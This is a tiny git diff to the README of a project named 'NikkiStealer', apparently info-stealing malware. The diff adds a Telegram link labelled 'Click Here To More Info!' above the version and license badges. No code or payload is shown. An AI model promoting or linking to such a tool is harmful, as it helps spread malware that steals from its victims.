@@ -1,5 +1,6 @@
 # 🚀 NikkiStealer 
 
+<a align="center" href="https://t.me/nikkist/1">Click Here To More Info!</a>
 <p align="center">
   <img src="https://img.shields.io/badge/Version-1.0.0-brightgreen" alt="Version">
   <img src="https://img.shields.io/badge/License-MIT-blue" alt="License">
